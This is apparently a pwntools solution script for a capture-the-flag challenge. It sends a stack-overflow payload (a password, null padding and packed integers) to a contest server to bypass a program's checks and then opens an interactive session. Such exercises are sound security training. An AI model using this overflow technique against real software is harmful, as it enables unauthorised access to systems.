from pwn import *

p = remote('shell.actf.co', 21303)
#p = process('./checks')

payload = b'password123\0'
payload += b'\0' * 64
payload += p32(17)
payload += p32(61)
payload += p32(245)
payload += p32(55)
payload += p32(50)

p.sendlineafter('Enter the secret word:', payload)
p.interactive()

